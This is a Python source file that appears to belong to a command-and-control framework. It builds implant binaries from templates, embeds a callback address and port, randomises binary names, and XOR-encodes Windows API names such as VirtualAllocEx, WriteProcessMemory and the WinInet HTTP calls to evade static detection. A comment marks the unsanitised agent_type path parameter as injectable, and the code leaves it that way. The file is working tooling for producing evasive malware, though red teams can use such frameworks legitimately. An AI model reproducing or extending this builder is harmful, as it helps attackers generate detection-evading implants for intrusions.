import shutil
import pathlib
import subprocess
import os
import threading
from modules.utils import generate_unique_id, generate_mashed_name
from modules.config import Config
from modules.log import log
import random

logger = log(__name__)


class HttpBuildInterface:
    def __init__(self, agent_type, callback_address, callback_port, agent_name=None):
        self.build_id = generate_unique_id()
        self.agent_type = agent_type
        self.callback_address = callback_address
        self.callback_port = callback_port
        self.project_root = pathlib.Path(Config().root_project_path)

        # Paths
        # root build path
        self.base_build_path = self.project_root / "data" / "build" / self.build_id
        # subdir where cmake build happens
        self.build_subdir = self.base_build_path / "build"
        # output dir under build subdir
        self.build_outdir = self.build_subdir / "bin"
        # very injectable
        # where to pull agent from
        logger.critical("INJECTABLE PARAMATER: agent_type")
        self.agent_template_path = (
            self.project_root / "data" / "agent_templates" / self.agent_type
        )
        # annnd where to output the binary after compilation
        self.compiled_binary_dir = (
            self.project_root
            / "data"
            / "compiled"  # / self.agent_type # coulduse this later if you want per agent dropdowns/file seperationg
        )

        self.config_file = self.base_build_path / "whisper_config.h"

        # generate some name w some mangling
        self.binary_name = f"{generate_mashed_name() if not agent_name else agent_name}_{agent_type}_{callback_address}_{callback_port}"  # use in macro replace?

        logger.debug(
            f"Initialized HttpBuildInterface with agent path: {self.agent_template_path}"
        )
        logger.debug(f"Build ID: {self.build_id}, Build Path: {self.base_build_path}")

    def build(self):
        thread = threading.Thread(target=self._run_build)
        thread.start()
        return self.build_id

    def _run_build(self):
        try:
            self.copy_from_template_files()
            self.macro_replace()  # Placeholder for macro replacement
            self.compile()
            self.copy_to_output_folder()
            logger.info(f"Build {self.build_id} completed successfully.")
        except Exception as e:
            logger.error(f"Build {self.build_id} failed: {e}")
            raise
        finally:
            pass
            self.cleanup()

    def copy_to_output_folder(self):
        try:
            logger.debug("Copying compiled binaries to output folder.")
            shutil.copytree(
                self.build_outdir, self.compiled_binary_dir, dirs_exist_ok=True
            )
        except Exception as e:
            logger.error(f"Failed to copy binaries to output folder: {e}")
            raise

    def copy_from_template_files(self):
        try:
            logger.debug(
                f"Copying template files from {self.agent_template_path} to {self.base_build_path}"
            )
            shutil.copytree(self.agent_template_path, self.base_build_path)
        except Exception as e:
            logger.error(f"Error copying template files: {e}")
            raise

    def compile(self):
        try:
            logger.debug("Starting CMake configuration.")
            subprocess.run(
                [
                    "cmake",
                    "-S",
                    str(self.base_build_path),
                    "-B",
                    str(self.build_subdir),
                ],
                check=True,
            )

            logger.debug("Building the project with CMake.")
            subprocess.run(["cmake", "--build", str(self.build_subdir)], check=True)

            logger.info(
                f"Compilation completed successfully for build {self.build_id}."
            )
        except subprocess.CalledProcessError as e:
            logger.error(f"Compilation failed: {e}")
            raise

    def macro_replace(self):
        logger.debug("Performing macro replacements.")

        # Dictionary of macros to replace in corresponding files
        # add here for each file name and it'll loop over to replace
        macro_replacements = {
            "CMakeLists.txt": {"MACRO_OUTPUT_NAME": self.binary_name},
            "whisper_config.h": {
                "MACRO_CALLBACK_ADDRESS": self.callback_address,
                "MACRO_CALLBACK_PORT": self.callback_port,
            },
        }

        for file_name, replacements in macro_replacements.items():
            file_path = self.base_build_path / file_name

            try:
                with open(file_path, "r+") as file:
                    contents = file.read()

                    # Apply all replacements
                    for macro, value in replacements.items():
                        logger.debug(f"Replacing {macro} with {value} in {file_name}")
                        contents = contents.replace(macro, value)

                    # Write updated content back to the file
                    file.seek(0)
                    file.write(contents)
                    file.truncate()

            except FileNotFoundError:
                logger.warning(f"File {file_name} not found. Skipping.")
            except Exception as e:
                logger.error(f"Error processing {file_name}: {e}")

        # Any other bigger macro replace funcs here
        self.macro_replace_xor_function_names()

    def cleanup(self):
        try:
            if self.base_build_path.exists():
                logger.debug(f"Cleaning up build directory: {self.base_build_path}")
                shutil.rmtree(self.base_build_path)
        except Exception as e:
            logger.warning(f"Cleanup failed: {e}")

    def macro_replace_xor_function_names(self):
        """Perform macro replacements in the header file using the build system."""
        logger.debug("Performing macro replacements in whisper_config.h")

        file_path = self.config_file

        # Define function names
        # note, have to do this manually for now
        function_names = [
            "MessageBoxA",
            "CreateThread",
            "ResumeThread",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreatePipe",
            "SetHandleInformation",
            "CloseHandle",
            "InternetOpenA",
            "InternetConnectA",
            "HttpOpenRequestA",
            "HttpSendRequestA",
            "InternetOpenUrlW",
            "InternetReadFile",
            "InternetCloseHandle",
            "GetUserNameW",
            "Sleep",
            "WaitForSingleObject",
            "ReadFile",
            "MessageBoxA",
            "CreateThread",
        ]

        # Define XOR key in binary format
        FUNC_ENCRYPTED_NAME_KEY = b"\xDE"  # Fixed binary XOR key

        # Define replacements dynamically
        macro_replacements = {
            "MACRO_FUNC_ENCRYPTED_NAME_KEY": f"0x{FUNC_ENCRYPTED_NAME_KEY.hex().upper()}",
        }

        logger.debug(
            f"XOR Key Used for Encryption: {FUNC_ENCRYPTED_NAME_KEY.hex().upper()}"
        )

        for func in function_names:
            encrypted_array = xor_obfuscate_to_c_array(func, FUNC_ENCRYPTED_NAME_KEY)
            macro_replacements[f"MACRO_FUNC_{func}_ENCRYPTED_NAME"] = encrypted_array
            logger.debug(
                f"Replacing MACRO_FUNC_{func}_ENCRYPTED_NAME with {encrypted_array}"
            )

        # Read and replace the macros in the header file (binary safe)
        try:
            if not file_path.exists():
                logger.error(f"Config file {file_path} does not exist!")
                return

            with open(file_path, "r+", encoding="utf-8") as file:
                contents = file.read()

                # Ensure replacements actually happen
                modified_contents = contents
                for macro, value in macro_replacements.items():
                    if macro in modified_contents:
                        logger.debug(f"Replacing {macro} with {value} in {file_path}")
                        modified_contents = modified_contents.replace(macro, value)
                    else:
                        logger.warning(f"Macro {macro} not found in {file_path}")

                # Only write if changes were made
                if modified_contents != contents:
                    file.seek(0)
                    file.write(modified_contents)
                    file.truncate()
                    logger.info(f"Successfully updated {file_path}")
                else:
                    logger.warning(f"No replacements were made in {file_path}")

        except FileNotFoundError:
            logger.warning(f"File {file_path} not found. Skipping.")
        except IOError as e:
            logger.error(f"File write error on {file_path}: {e}")
        except Exception as e:
            logger.error(f"Error processing {file_path}: {e}")


def xor_obfuscate_to_c_array(input_string: str, key: bytes):
    """
    XOR-obfuscate function name using a binary XOR key and return a properly formatted C-style hex array.

    :param input_string: The function name to encrypt.
    :param key: A single-byte `bytes` object (e.g., b'\xDE').
    :return: A formatted C-style array string (e.g., "{ 0x5D, 0x75, 0x63, 0x63, 0x71, 0x00 }").
    """
    if not isinstance(key, bytes) or len(key) != 1:
        raise TypeError(
            f"XOR key must be a single-byte `bytes`, got {type(key).__name__}: {key}"
        )

    key_byte = key[0]  # Extract actual byte value (integer)
    input_bytes = input_string.encode("utf-8")  # Convert to raw bytes

    # XOR each byte and convert to hex format
    obfuscated = [f"0x{b ^ key_byte:02X}" for b in input_bytes]

    # Ensure proper null termination
    obfuscated.append("0x00")

    result = "{ " + ", ".join(obfuscated) + " };"

    # Debugging
    print(f"[DEBUG] XOR Key: {key.hex().upper()}")
    print(f"[DEBUG] Input Bytes: {input_bytes.hex().upper()}")
    print(f"[DEBUG] Obfuscated Output: {result}")

    return result


def generate_xor_key(length=1):
    """
    Generate a random XOR key of the specified length as a hex integer.

    - If `length=1`, returns an integer in hex format (e.g., 0x3F).
    - If `length>1`, returns a list of hex integers (e.g., [0x3F, 0xA2, 0xC1]).

    The key avoids null bytes (0x00) to ensure proper encryption.

    :param length: Length of the XOR key (default: 1)
    :return: An integer (if length=1) or a list of hex integers (if length > 1)
    """
    if length < 1:
        raise ValueError("XOR key length must be at least 1")

    key = os.urandom(length)
    key = [b if b != 0 else random.randint(1, 255) for b in key]  # Avoid 0x00

    if length == 1:
        return key[0]  # Return as int (e.g., 0x3F)
    return key  # Return as list of hex values (e.g., [0x3F, 0xA2, 0xC1])
